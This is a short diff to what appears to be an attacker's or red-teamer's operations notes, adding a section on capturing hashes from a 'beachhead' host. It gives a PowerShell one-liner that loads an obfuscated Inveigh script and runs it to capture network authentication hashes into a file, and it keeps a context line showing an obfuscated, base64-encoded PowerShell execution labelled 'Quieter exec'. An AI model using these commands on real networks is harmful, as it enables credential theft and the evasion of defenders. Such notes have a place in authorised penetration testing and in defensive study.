@@ -55,6 +55,17 @@ tree $home
 
 ****
 
+Capping hashes from beachhead:
+- https://github.com/Kevin-Robertson/Inveigh
+
+```powershell
+. .\Inveigh-OBFUSCATED.ps1;Invoke-Inveigh -ConsoleOutput Y -Elevated N -FileOutput Y -FileOutputDirectory C:\software\.poon -FileUnique Y
+```
+
+
+
+****
+
 
 **Quieter exec:**
 - powershell ([char]45+[char]101+[char]99) YwBhAGwAYwA=
